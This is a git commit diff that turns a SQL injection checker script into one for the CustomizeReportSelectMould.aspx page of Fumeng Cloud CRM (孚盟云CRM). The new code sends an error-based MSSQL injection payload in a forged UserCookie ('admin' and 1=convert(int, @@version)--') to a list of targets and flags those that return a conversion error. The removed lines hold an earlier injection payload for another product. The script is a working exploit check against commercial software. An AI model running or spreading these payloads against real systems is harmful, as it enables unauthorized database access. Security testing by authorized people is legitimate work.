9a62a22e20f8664e59c537609b72378e847c9074
王炜博 <wangweibo@vackbot.com>
2026-04-28 11:36:41 +0800

    添加孚盟云CRM CustomizeReportSelectMould.aspx SQL注入漏洞

--- SQLi/fumacrm_CustomizeReportSelectMould sqli.py
+++ SQLi/fumacrm_CustomizeReportSelectMould sqli.py
@@ -9,21 +9,21 @@ def check(target):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
         "Accept": "*/*",
-        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary",
-    }
+        }
 
-    url = '/HuiYuan/HuiYuanDangAn/picHY.aspx'
+    url = '/m/Dingding/CustomizeReport/CustomizeReportSelectMould.aspx'
 
-    if not target.startswith("http"):
-        target = f"http://{taret}"
+    if not target.startswith('http'):
+        target = f'http://{target}'
 
-    data = '------WebKitFormBoundary\r\nContent-Disposition: form-data; name="hyh"\r\n\r\n\'-1/user--\r\n------WebKitFormBoundary--'
+    cookies = {"UserCookie":"{\"empId\":\"admin' and 1=convert(int, @@version)--+-\",\"corpId\": \"1\"}"}
 
     try:
-        resp = requests.post(target + url, headers=headers,
-                             data=data, verify=False, timeout=30)
-        if resp.status_code == 500 and "在将 nvarchar 值 'dbo' 转换成数据类型 int 时失败" in resp.text:
+        resp = requests.get(target + url,  headers=headers, cookies=cookies, verify=False, timeout=30)
+        if resp.status_code == 500 and '在将 nvarchar 值' in resp.text:
             print(f"{target} 存在漏洞")
+        else:
+            print(f"{target} 不存在漏洞")
     except RequestException as e:
         print(e)
 
@@ -32,20 +32,21 @@ def main(args):
     if args.file:
         try:
             with open(args.file, 'r') as f:
-                file_content = f.readlines()
+                filecontent = f.readlines()
         except FileNotFoundError:
             print(f"Error: File '{args.file}' not found.")
             exit(1)
-        for i in file_content:
+        for i in filecontent:
             check(i.strip())
     else:
         check(args.url)
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Check a8ery picHY.aspx SQLi")
+    parser = argparse.ArgumentParser(description="检测孚盟云CRM CustomizeReportSelectMould.aspx SQL注入漏洞")
     parser.add_argument("-u", "--url", help="Test url")
     parser.add_argument("-f", "--file", help="Test url file")
 
     args = parser.parse_args()
     main(args)
+
